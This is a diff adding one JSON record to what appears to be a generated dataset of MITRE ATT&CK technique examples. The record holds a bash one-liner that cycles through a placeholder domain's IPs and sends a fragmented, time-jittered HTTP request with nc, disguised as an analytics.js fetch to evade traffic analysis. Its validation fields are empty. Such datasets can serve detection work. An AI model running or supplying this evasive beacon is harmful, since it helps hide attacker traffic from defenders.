@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"host=update-assets.example.com; ips=$(dig +short \\\"$host\\\" A); ua=\\\"Mozilla/5.0 (X11; Ubuntu) AppleWebKit/537.36\\\"; req=$(printf 'GET /analytics.js HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nAccept: */*\\r\\nConnection: close\\r\\n\\r\\n' \\\"$host\\\" \\\"$ua\\\"); for ip in $(printf '%s\\n' \\\"$ips\\\" | shuf); do printf '%s' \\\"$req\\\" | fold -w 20 | while read -r chunk; do printf '%s' \\\"$chunk\\\"; sleep 0.$((RANDOM%5+1)); done | nc -w 5 \\\"$ip\\\" 80 && break; sleep $((RANDOM%3+1)); done\"",
+  "explanation": "Implements fast flux by shuffling through multiple A records for a domain, fragmenting the HTTP request and adding timing jitter to evade traffic analysis while mimicking a request for analytics.js.",
+  "rationale_steps": [
+    "Query multiple A records to leverage fast-flux style dynamic resolution.",
+    "Randomize IP selection at runtime for resiliency.",
+    "Mimic normal HTTP traffic (analytics.js) with realistic headers.",
+    "Fragment the request and add delays to complicate analysis."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-1d90a008",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
